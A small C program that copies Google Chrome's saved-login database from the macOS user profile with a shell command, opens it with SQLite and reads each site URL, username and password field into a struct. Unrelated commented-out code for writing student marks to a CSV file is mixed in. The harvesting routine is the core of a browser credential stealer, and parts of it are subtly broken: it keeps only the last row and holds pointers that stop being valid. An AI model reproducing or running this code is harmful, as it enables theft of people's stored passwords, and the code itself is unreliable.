#include<stdio.h>
#include<string.h>
#include <sqlite3.h>
#include <stdlib.h>

struct user_info {
    char * url;
    char * username;
    char * password;
};

void create_marks_csv(char *filename, int a[][3], int n, int m)
{
    printf("\n Creating %s.csv file",filename);
    FILE *fp;
    int i,j;
    filename=strcat(filename,".csv");
    fp=fopen(filename,"w+");
    fprintf(fp,"Student Id; Physics; Chemistry;pr Maths");

    for(i=0;i<m;i++){
        fprintf(fp,"\n%d",i+1);
        for(j=0;j<n;j++)
            fprintf(fp,";%d ",a[i][j]);
    }
    fclose(fp);
    printf("\n %sfile created",filename);

}

static int callback(void * data, int argc, char **argv, char **azColName)
{
    int i;

    struct user_info * parent_ = (struct user_info *)data;

    for(i = 0; i < argc; i++)
    {
        if(strcmp(azColName[i], "password_value") == 0)
        {
            parent_->password = argv[i] ? argv[i] : "NULL";
        }
        else if(strcmp(azColName[i], "origin_url") == 0)
        {
            parent_->url = argv[i] ? argv[i] : "NULL";
        }
        else if(strcmp(azColName[i], "username_value") == 0)
        {
            parent_->username = argv[i] ? argv[i] : "NULL";
        }
    }

    return 0;
}

int main()
{

    sqlite3 * db;

    char * zErrMsg = 0;

    int rc;

    char * sql;

    struct user_info * userData_;
    userData_ = (struct user_info*) malloc(sizeof(struct user_info));

    // Copy file Logindata
    system("cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ./login_chrome");

    rc = sqlite3_open_v2("./login_chrome", &db, SQLITE_OPEN_READONLY, NULL);

    if( rc != SQLITE_OK) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return EXIT_FAILURE;
    }

    // Create SQL statement
    sql = "SELECT * FROM 'logins'";

    // Execute SQL statement
    rc = sqlite3_exec(db, sql, callback, (void*)userData_, &zErrMsg);

    if( rc != SQLITE_OK ) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }

    sqlite3_close(db);

    /*
    int a[3][3]={{50,50,50},{60,60,60},{70,70,70}};
    char str[100];

    printf("\n Enter the filename :");
    gets(str);
    create_marks_csv(str,a,3,3);

    return 0;*/
}